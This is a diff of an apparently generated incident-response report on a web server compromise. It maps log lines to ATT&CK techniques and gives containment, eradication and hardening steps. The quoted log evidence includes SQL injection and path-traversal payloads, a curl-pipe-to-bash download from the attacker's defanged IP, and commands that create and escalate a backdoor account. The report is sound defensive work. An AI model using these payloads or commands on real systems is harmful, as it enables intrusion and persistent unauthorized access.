@@ -8,46 +8,49 @@
 | 🟥 critical | SQL injection attempts, answered with 200 | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:03:12 +0000] "GET /products?id=1'%20OR%20'1'='1 HTTP/1.1" 200 8821 "-" "sqlmap/1.7-dev" |
 | 🟥 critical | Login succeeded from a source that was guessing passwords | T1078 | Oct  5 01:13:58 maple-lane-web sshd[21777]: Accepted password for deploy from 203.0.113[.]47 port 41999 ssh2 |
 | 🟧 high | Path traversal attempts | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:03:30 +0000] "GET /order?file=../../../../etc/passwd HTTP/1.1" 403 153 "-" "sqlmap/1.7-dev" |
-| 🟧 high | New account created | T1136 | Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup |
+| 🟧 high | New account created | T1136 | Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup |
 | 🟧 high | SQL injection attempts | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:03:11 +0000] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 512 "-" "sqlmap/1.7-dev" |
-| 🟧 high | Account added to an admin group | T1098 | Oct  5 01:14:55 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup |
-| 🟧 high | Download-and-run command | T1105 | Oct  5 01:15:20 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/bin/sh -c curl -fsSL hxxp://203.0.113[.]47/x/update.sh / bash |
+| 🟧 high | Account added to an admin group | T1098 | Oct  5 01:14:55 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo svc-backup |
+| 🟧 high | Download-and-run command | T1105 | Oct  5 01:15:20 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh -c curl -fsSL hxxp://203.0.113[.]47/x/update.sh / bash |
 | 🟨 medium | Password guessing from 203.0.113[.]47 | T1110.001 | Oct  5 01:05:01 maple-lane-web sshd[20001]: Failed password for invalid user admin from 203.0.113[.]47 port 40001 ssh2 |
 | 🟨 medium | Vulnerability scanner traffic | T1595 | 203.0.113[.]47 - - [05/Oct/2026:01:02:03 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)" |
 | 🟨 medium | Probes for sensitive files and admin panels | T1190 | 203.0.113[.]47 - - [05/Oct/2026:01:02:03 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)" |
 | 🟨 medium | Scheduled task or cron change | T1053 | Oct  5 01:15:40 maple-lane-web crontab[22044]: (deploy) REPLACE (deploy) |
-| 🟨 medium | Program run from a temp folder | T1204 | Oct  5 01:16:03 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/update |
-| 🟦 low | Commands run with sudo | T1548.003 | Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/h**** ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup |
+| 🟨 medium | Program run from a temp folder | T1204 | Oct  5 01:16:03 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chmod +x /tmp/.cache/update |
+| 🟦 low | Commands run with sudo | T1548.003 | Oct  5 01:14:40 maple-lane-web sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash svc-backup |
 
-### What happened
-Between 01:02Z and 01:16Z on October 5, 2026, the IP address 203.0.113[.]47 launched a targeted attack against `maple-lane-web`. The attacker first scanned for vulnerabilities, then successfully exploited a SQL injection vulnerability in the `/products` endpoint at 01:03Z. Shortly after, they brute-forced the `deploy` account via SSH, gaining access at 01:13Z. Once inside, the attacker created a new user `svc-backup`, granted it sudo privileges, and downloaded a suspicious script from 203.0.113[.]47 at 01:15Z. Finally, they established persistence by modifying the cron table and executing a file from `/tmp/.cache/update`.
+**1. What happened**
+At 01:02 UTC on Oct 5, an attacker from `203.0.113[.]47` began scanning `maple-lane-web` for vulnerabilities. By 01:03, they successfully exploited a SQL injection vulnerability in the `/products` endpoint, receiving a `200` response. Between 01:05 and 01:13, they brute-forced the `deploy` account via SSH. At 01:14, after gaining access, the attacker created a new user `svc-backup` and added it to the `sudo` group. Finally, at 01:15, they downloaded and executed a script from the attacker's IP and established persistence via a cron job and a binary in `/tmp/.cache/`.
 
-### Severity and scope
-This is a **critical** incident with a high likelihood of data exfiltration. The `deploy` account is compromised, and the creation of a new sudo-enabled account suggests persistent access. The SQL injection response (200 OK) indicates potential access to the database containing user credentials or order data. The scope includes the web server `maple-lane-web`, the `deploy` account, and the newly created `svc-backup` account. We are highly confident in the compromise based on successful logins and privileged command execution.
+**2. Severity and scope**
+**Critical.** The entire `maple-lane-web` host is compromised. The `deploy` account credentials are stolen, and the new `svc-backup` account has root-equivalent privileges. Since the SQL injection returned `200`, assume the database containing customer data was exfiltrated or modified. We are highly confident in the attack vector based on log correlation, but we do not yet know the full extent of data theft.
 
-### Contain now
-1. **Isolate `maple-lane-web`**: Disconnect it from the network immediately to stop data exfiltration and lateral movement.
-2. **Disable compromised accounts**: Suspend the `deploy` and `svc-backup` accounts immediately.
-3. **Block the attacker IP**: Add 203.0.113[.]47 to your firewall block list to prevent further intrusion attempts.
-4. **Preserve evidence**: Take a forensic image of the system disk before rebooting or making changes.
+**3. Contain now**
+1.  **Isolate** `maple-lane-web` from the network immediately. Do not shut it down; you need the memory and disk state for forensics.
+2.  **Disable** the `svc-backup` account (`usermod -L svc-backup`) and remove it from the `sudo` group (`gpasswd -d svc-backup sudo`).
+3.  **Reset** the password for the `deploy` account and any other shared credentials.
+4.  **Block** `203.0.113[.]47` at the perimeter firewall and WAF.
+5.  **Suspend** web application access to the database to prevent further data exfiltration while you investigate.
 
-### Eradicate and recover
-1. **Rebuild the server**: Do not trust the current OS. Rebuild `maple-lane-web` from a known-good image.
-2. **Patch vulnerabilities**: Fix the SQL injection bug in the `/products` endpoint by using parameterized queries.
-3. **Rotate secrets**: Change all passwords, API keys, and database credentials associated with `maple-lane-web` and any integrated services.
-4. **Review logs**: Check other servers for connections from 203.0.113[.]47 or logins using the `deploy` credentials.
+**4. Eradicate and recover**
+1.  Delete the malicious cron entries for `deploy` and `root`.
+2.  Remove the executable at `/tmp/.cache/update`.
+3.  Patch the SQL injection vulnerability in the `/products` endpoint (parameterize queries).
+4.  Rebuild the web server from a known-good image. Do not trust the current filesystem as the attacker may have planted other backdoors.
+5.  Restore database integrity from a pre-attack backup (before 01:02 UTC) and verify no unauthorized records exist.
 
-### Harden so it doesn't happen again
-1. **Disable password auth for SSH**: Use key-based authentication only and restrict SSH access to specific IPs if possible.
-2. **Implement WAF**: Deploy a Web Application Firewall to filter out SQL injection and path traversal attacks.
-3. **Least Privilege**: Ensure the `deploy` account does not have sudo rights. Use dedicated service accounts with minimal permissions.
-4. **Monitor and Alert**: Set up alerts for new user creation, sudo usage, and failed login spikes.
+**5. Harden so it doesn't happen again**
+1.  Disable SSH password authentication; use key-based authentication only.
+2.  Implement a Web Application Firewall (WAF) with SQL injection rules.
+3.  Restrict `sudo` privileges for the `deploy` user; it should not have unrestricted root access.
+4.  Monitor cron jobs and new user creation with real-time alerting.
+5.  Ensure `/tmp` is mounted with the `noexec` option to prevent running binaries from temporary directories.
 
-### What to collect next
-*   **Database logs**: Review queries executed around 01:03Z to determine what data was accessed or exfiltrated.
-*   **File integrity**: Compare file hashes against a baseline to identify any modified system binaries.
-*   **Outbound connections**: Review netstat or proxy logs for connections to 203.0.113[.]47 or other unknown domains during the incident window.
-*   **Open questions**: Did the SQL injection query leak any PII? Was the `update.sh` script a reverse shell or cryptominer?
+**6. What to collect next**
+*   **Memory dump** of the host to identify any in-process malware.
+*   **Database logs** to confirm what data was accessed during the 01:03 SQL injection.
+*   **Source code audit** of the `/products` endpoint to confirm the fix.
+*   **Question:** Was `svc-backup` a planned account? If not, it is malicious. If yes, who authorized it?
 
 ## Indicators (defanged)
 - **Public IPs** (3): `198.51.100[.]23`, `203.0.113[.]47`, `198.51.100[.]76`
